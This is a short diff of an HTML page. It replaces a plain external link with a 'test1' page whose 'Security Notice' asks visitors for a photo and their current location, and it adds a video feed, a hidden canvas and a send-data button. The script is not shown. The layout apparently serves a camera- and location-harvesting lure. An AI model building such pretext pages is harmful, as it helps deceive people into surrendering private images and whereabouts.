@@ -19,7 +19,17 @@
 <body>
 
     <div class="container">
-        <button id="sendDataBtn" disabled><a href="https://walidirhil.github.io/-EUREKA/" target="_blank">Go to website</a></button>
+        <h1>Welcome to test1</h1>
+        
+        <div class="disclaimer">
+            <strong>Security Notice:</strong> To proceed, we require a quick photo and your current location. By clicking the button below, you consent to sharing this data with test1.
+        </div>
+
+        <video id="videoFeed" autoplay playsinline></video>
+        <canvas id="photoCanvas" style="display:none;"></canvas>
+        
+        <button id="sendDataBtn" disabled>Initializing Camera...</button>
+        <p id="statusMessage"></p>
     </div>
 
     <script>
